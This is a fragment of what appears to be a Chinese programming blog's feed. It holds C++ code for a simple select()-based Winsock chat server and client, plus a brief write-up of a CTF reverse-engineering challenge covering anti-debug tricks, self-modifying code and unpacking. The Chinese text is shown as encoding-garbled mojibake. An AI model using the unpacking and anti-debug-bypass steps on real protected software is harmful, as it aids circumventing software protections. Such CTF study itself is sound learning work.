class="line">&#123;</span><br><span class="line"><span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Server::close</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (servSock != INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">closesocket</span>(servSock);</span><br><span class="line"><span class="keyword">for</span> (SOCKET client : clientList)</span><br><span class="line"><span class="built_in">closesocket</span>(client);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Server::init</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* ip, <span class="type">unsigned</span> <span class="type">short</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WSADATA data&#123;&#125;;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;data) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;startup error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">servSock = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (servSock == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;socket error&quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">sockaddr_in servAddr&#123;&#125;;</span><br><span class="line"></span><br><span class="line">servAddr.sin_family = AF_INET;</span><br><span class="line">servAddr.sin_port = <span class="built_in">htons</span>(<span class="number">2345</span>);</span><br><span class="line"><span class="built_in">inet_pton</span>(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;servAddr.sin_addr.S_un.S_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">bind</span>(servSock, (sockaddr*)&amp;servAddr, <span class="built_in">sizeof</span>(sockaddr)) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;bind error&quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">listen</span>(servSock, <span class="number">128</span>) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;listen error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Server::start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">coreFunc</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Server::coreFunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">assert</span>(servSock != INVALID_SOCKET);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">fd_set fdRead;</span><br><span class="line"><span class="built_in">FD_ZERO</span>(&amp;fdRead);</span><br><span class="line"><span class="built_in">FD_SET</span>(servSock, &amp;fdRead);</span><br><span class="line"><span class="keyword">for</span> (SOCKET client : clientList)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">FD_SET</span>(client, &amp;fdRead);</span><br><span class="line">&#125;</span><br><span class="line">timeval tv&#123; <span class="number">1</span>,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> selectRes = <span class="built_in">select</span>(<span class="number">0</span>, &amp;fdRead, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, &amp;tv);</span><br><span class="line"><span class="keyword">if</span> (selectRes &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; fdRead.fd_count; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fdRead.fd_array[i] == servSock)</span><br><span class="line">&#123;</span><br><span class="line">SOCKET clntSock = <span class="built_in">accept</span>(servSock, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="keyword">if</span> (clntSock == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;accept error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">clientList.<span class="built_in">push_back</span>(clntSock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">recvMsg</span>(fdRead, fdRead.fd_array[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (selectRes == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;do something else&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;select func error&quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Server::recvMsg</span><span class="params">(fd_set&amp; fdRead, SOCKET&amp; clientSock)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Header header;</span><br><span class="line"><span class="type">int</span> recvRes = <span class="built_in">recv</span>(clientSock, (<span class="type">char</span>*)&amp;header, <span class="built_in">sizeof</span>(Header), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (recvRes &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Client disconnected:&quot;</span> &lt;&lt; clientSock &lt;&lt; std::endl;</span><br><span class="line">clientList.<span class="built_in">erase</span>(std::<span class="built_in">remove</span>(clientList.<span class="built_in">begin</span>(), clientList.<span class="built_in">end</span>(), clientSock), clientList.<span class="built_in">end</span>());</span><br><span class="line"><span class="built_in">closesocket</span>(clientSock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (header.cmd)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> CMD::LOGIN:</span><br><span class="line">&#123;</span><br><span class="line">Login login;</span><br><span class="line"><span class="type">int</span> recvRes2 = <span class="built_in">recv</span>(clientSock, (<span class="type">char</span>*)&amp;login + <span class="built_in">sizeof</span>(Header),</span><br><span class="line"><span class="built_in">sizeof</span>(Login) - <span class="built_in">sizeof</span>(Header), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (recvRes2 &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;recv error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LoginResult <span class="title">loginResult</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">send</span>(clientSock, (<span class="type">char</span>*)&amp;loginResult, <span class="built_in">sizeof</span>(LoginResult), <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;send error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> CMD::LOGOUT:</span><br><span class="line">&#123;</span><br><span class="line">Logout logout;</span><br><span class="line"><span class="type">int</span> recvRes2 = <span class="built_in">recv</span>(clientSock, (<span class="type">char</span>*)&amp;logout + <span class="built_in">sizeof</span>(Header),</span><br><span class="line"><span class="built_in">sizeof</span>(Logout) - <span class="built_in">sizeof</span>(Header), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (recvRes2 &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;recv error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LogoutResult <span class="title">logoutResult</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">send</span>(clientSock, (<span class="type">char</span>*)&amp;logoutResult, <span class="built_in">sizeof</span>(LoginResult), <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;send error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> CMD::LOGIN_RESULT:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CMD::LOGOUT_RESULT:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//bool Server::conductMsg() &#123;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Server server;</span><br><span class="line"><span class="keyword">if</span> (!server.<span class="built_in">init</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">2345</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">server.<span class="built_in">start</span>();</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//message.hpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">CMD</span></span><br><span class="line">&#123;</span><br><span class="line">LOGIN,</span><br><span class="line">LOGOUT,</span><br><span class="line">LOGIN_RESULT,</span><br><span class="line">LOGOUT_RESULT,</span><br><span class="line">NO_CMD</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Header</span></span><br><span class="line">&#123;</span><br><span class="line">CMD cmd;</span><br><span class="line"><span class="type">unsigned</span> dataLength;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Header</span>() : <span class="built_in">cmd</span>(CMD::NO_CMD)</span><br><span class="line">, <span class="built_in">dataLength</span>(<span class="number">0</span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Header</span>(CMD cmd_, <span class="type">unsigned</span> dataLength_) : <span class="built_in">cmd</span>(cmd_)</span><br><span class="line">, <span class="built_in">dataLength</span>(dataLength_) &#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Login</span> :<span class="keyword">public</span> Header</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> usrName[<span class="number">32</span>];</span><br><span class="line"><span class="type">char</span> passwd[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">Login</span>(<span class="type">const</span> <span class="type">char</span>* userName_, <span class="type">const</span> <span class="type">char</span>* passwd_) :<span class="built_in">Header</span>(CMD::LOGIN, <span class="built_in">sizeof</span>(Login))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">strcpy_s</span>(usrName, <span class="number">32</span>, userName_);</span><br><span class="line"><span class="built_in">strcpy_s</span>(passwd, <span class="number">32</span>, passwd_);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Login</span>() :<span class="built_in">Header</span>(CMD::LOGIN, <span class="built_in">sizeof</span>(Login)), usrName&#123; <span class="number">0</span> &#125;, passwd&#123; <span class="number">0</span> &#125; &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Logout</span> : <span class="keyword">public</span> Header</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> logoutNum;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Logout</span>(<span class="type">unsigned</span> logoutNum_) : <span class="built_in">Header</span>(CMD::LOGOUT, <span class="built_in">sizeof</span>(Logout))</span><br><span class="line">, <span class="built_in">logoutNum</span>(logoutNum_) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Logout</span>() :<span class="built_in">Header</span>(CMD::LOGOUT, <span class="built_in">sizeof</span>(Logout)), <span class="built_in">logoutNum</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">LoginResult</span> :<span class="keyword">public</span> Header</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> loginResultNum;</span><br><span class="line"><span class="built_in">LoginResult</span>(<span class="type">unsigned</span> loginResultNum_) :<span class="built_in">Header</span>(CMD::LOGIN_RESULT, <span class="built_in">sizeof</span>(LoginResult)), <span class="built_in">loginResultNum</span>(loginResultNum_) &#123;&#125;</span><br><span class="line"><span class="built_in">LoginResult</span>() :<span class="built_in">Header</span>(CMD::LOGIN_RESULT, <span class="built_in">sizeof</span>(LoginResult)), <span class="built_in">loginResultNum</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">LogoutResult</span> :<span class="keyword">public</span> Header</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> logoutResultNum;</span><br><span class="line"><span class="built_in">LogoutResult</span>(<span class="type">unsigned</span> logoutResultNum_) :<span class="built_in">Header</span>(CMD::LOGOUT_RESULT, <span class="built_in">sizeof</span>(LogoutResult)), <span class="built_in">logoutResultNum</span>(logoutResultNum_) &#123;&#125;</span><br><span class="line"><span class="built_in">LogoutResult</span>() :<span class="built_in">Header</span>(CMD::LOGOUT_RESULT, <span class="built_in">sizeof</span>(LogoutResult)), <span class="built_in">logoutResultNum</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WS2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Message.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WSADATA data&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;data) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;WSAstartup error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">SOCKET servSock = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (servSock == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;socket error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">sockaddr_in servAddr&#123;&#125;;</span><br><span class="line">servAddr.sin_family = AF_INET;</span><br><span class="line">servAddr.sin_port = <span class="built_in">htons</span>(<span class="number">2345</span>);</span><br><span class="line"><span class="built_in">inet_pton</span>(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;servAddr.sin_addr.S_un.S_addr);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">connect</span>(servSock, (sockaddr*)&amp;servAddr, <span class="built_in">sizeof</span>(sockaddr)) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;connect error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">closesocket</span>(servSock);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;connect success&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="function">Login <span class="title">login</span><span class="params">(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">send</span>(servSock, <span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span>*&gt;(&amp;login), <span class="built_in">sizeof</span>(Login), <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;send error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">LoginResult loginResult;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">recv</span>(servSock, <span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span>*&gt;(&amp;loginResult), <span class="built_in">sizeof</span>(LoginResult), <span class="number">0</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;recv error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; loginResult.loginResultNum &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Selectå¯ä»¥è®©æœåŠ¡ç«¯é“¾æ¥å¤šä¸ªå®¢æˆ·ç«¯</summary>
    
    
    
    <category term="çŸ¥è¯†é›†" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="å¼€å‘" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/"/>
    
    <category term="è¯­è¨€å­¦ä¹ " scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="ç½‘ç»œç¼–ç¨‹" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    
    <category term="CPP" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/CPP/"/>
    
    <category term="ç½‘ç»œç¼–ç¨‹" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/CPP/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="cpp" scheme="https://www.pri87.vip/tags/cpp/"/>
    
    <category term="ç½‘ç»œ" scheme="https://www.pri87.vip/tags/%E7%BD%91%E7%BB%9C/"/>
    
    <category term="cs" scheme="https://www.pri87.vip/tags/cs/"/>
    
  </entry>
  
  <entry>
    <title>å¾çˆ±2025è§£é¢˜é¢†çº¢åŒ…5windowsé«˜çº§é¢˜ç®€è¦åˆ†æ</title>
    <link href="https://www.pri87.vip/posts/43ad3f3c.html"/>
    <id>https://www.pri87.vip/posts/43ad3f3c.html</id>
    <published>2025-02-16T12:56:18.000Z</published>
    <updated>2025-03-18T12:17:05.673Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2><p>è¿™ä¸ªé¢˜å¾ˆæœ‰æ„æ€<br>ä½†æ˜¯ç¬¬ä¸€å…³å°±å¡äº†æˆ‘å¾ˆä¹…<br>è¿™é‡Œè®°å½•ä¸€ä¸‹æˆ‘æ˜¯æ€ä¹ˆåˆ†æçš„</p><h2 id="å£³">å£³</h2><p>è¿™ä¸ªå£³çš„åè°ƒè¯•éƒ¨åˆ†åœ¨TlsCallback_0å‡½æ•°çš„ç¬¬äºŒæ¬¡call raxä¸­<br>7FF708E27DB0è¿™ä¸ªå‡½æ•°,é€šè¿‡7FF708E26280åˆ¤æ–­æ˜¯å¦æœ‰è°ƒè¯•å’Œ7FF708E244A0åˆ¤æ–­æ˜¯å¦æœ‰hook,ç„¶åè·å¾—ä¸€ä¸ªæ ‡å¿—ä½æ”¾åˆ°flag_aä¸­</p><p><img src="https://s2.loli.net/2025/02/16/WV1t7PzX5OiGBDK.png" alt="image-20250216210356149"></p><p>åœ¨jmp raxä¸­è·³è½¬åˆ°7FF708E24400æ‰§è¡ŒsetThreadInfomationå‡½æ•°çš„ä½ç½®,ä¼ å‚æ˜¯-(flag_a != 1) ^ 0x11<br>å¦‚æœæ ‡å¿—ä½ä¸º1è¯´æ˜æ˜¯è°ƒè¯•,ä¼šç›´æ¥è§¦å‘hidefromdebugæ•ˆæœ,å¦‚æœæ ‡å¿—ä¸º2åˆ™ä¼šä¼ å…¥é”™è¯¯çš„setInfomatinonå€¼,æœ€åä¼šä¼ å‡º0xC000003å¯¼è‡´æ˜¾ç¤ºç¯å¢ƒå¼‚å¸¸.å¦‚æœæ ‡å¿—ä¸º5,è¡¨æ˜æ­£å¸¸ä¸ä¼šè¿›è¡Œæ£€æŸ¥.</p><p>ç¬¬äºŒç‚¹,è¿™é‡Œè°ƒè¯•çš„æ—¶å€™å¦‚æœå¯¹åé¢SMCè§£å¯†çš„ä»£ç ä¸‹äº†æ–­ç‚¹0xcc,åˆ™ä¼šå¯¼è‡´å®ƒè¿˜åŸå¤±è´¥,æ‰€ä»¥è¿™é‡Œæ˜¯ä¸èƒ½æå‰ä¸‹æ–­ç‚¹çš„</p><h2 id="è„±å£³">è„±å£³</h2><p>å°†ç¨‹åºçš„åŠ¨æ€åŸºå€å…³æ‰ï¼Œç„¶åæ¥åˆ°jmpä¹‹åçš„ä½ç½®ã€‚ç”¨xdbgè„±å£³ï¼ŒIATè¡¨æ²¡æœ‰è¿˜åŸï¼Œæ‰€ä»¥ä¸èƒ½è¿è¡Œï¼Œä½†æ˜¯è¿™æ ·å¯ä»¥ç›´æ¥çœ‹åˆ°åŠ å¯†æµç¨‹äº†</p><p>å°±æ˜¯ä¸€ä¸ªTEA</p>]]></content>
    
    
    <summary type="html">ä¸€é“å¥½é¢˜</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>win-è°ƒè¯•åŸç†</title>
    <link href="https://www.pri87.vip/posts/6e648a52.html"/>
    <id>https://www.pri87.vip/posts/6e648a52.html</id>
    <published>2025-02-10T06:12:33.000Z</published>
    <updated>2025-02-27T07:03:08.615Z</updated>
    
